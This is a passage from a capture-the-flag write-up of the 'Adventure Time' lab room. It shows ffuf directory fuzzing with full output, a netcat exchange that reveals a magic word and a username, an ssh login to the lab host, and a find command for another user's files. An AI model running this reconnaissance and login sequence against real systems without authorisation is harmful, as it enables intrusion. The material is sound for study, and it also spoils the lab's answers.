&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 328ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 347ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">yellowdog &lt;span class="o">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We found another subdirectory&lt;/p>
&lt;p>Another time:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/yellowdog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/yellowdog/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 64ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 62ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bananastock &lt;span class="o">[&lt;/span>Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 199ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And now we got another code:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This time we got this:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I tried to put that in the service running but no luck:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">THE BANANAS ARE THE BEST!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The magic word is not THE BANANAS ARE THE BEST!!!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I just started another fuzzer&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/yellowdog/bananastock/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/yellowdog/bananastock/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 54ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 68ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 65ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 58ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 328ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 337, Words: 39, Lines: 14, Duration: 60ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">princess &lt;span class="o">[&lt;/span>Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And finally we got what we were searching:&lt;/p>
&lt;p>&lt;img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/7fecbb84-9598-4ec2-9fa9-5ad99163bcf9/26707c7e-4328-4b37-9e1f-5b3357f3c284/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>This is either AES or DES,&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%205.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>It was AES.&lt;/p>
&lt;p>And we got that:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.237.150 &lt;span class="m">31337&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ricardio
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The new username is: apple-guards
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I tried using ssh with the password that we found before:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh apple-guards@10.10.237.150
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.10.237.150 (10.10.237.150)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:oousiKsHNim8zwOz0eyM11NPdqD8vdPNZ23JWmvYNSM.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This key is not known by any other names.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.10.237.150&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">apple-guards@10.10.237.150&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.3 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-62-generic x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Canonical Livepatch is available &lt;span class="k">for&lt;/span> installation.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Reduce system reboots and improve kernel security. Activate at:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/livepatch
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> package can be updated.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No mail.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Sat Sep &lt;span class="m">21&lt;/span> 20:51:11 &lt;span class="m">2019&lt;/span> from 192.168.245.129
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apple-guards@at:~$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apple-guards
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>There there are 2 flags, flag1, and flag, the flag one is encrypted in md5.&lt;/p>
&lt;p>Since the hint tells us: (Can you search for someones files?)&lt;/p>
&lt;p>I searched for the files owned by marceline:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -user marceline 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/fonts/helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/marceline
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">======================================&lt;/span>
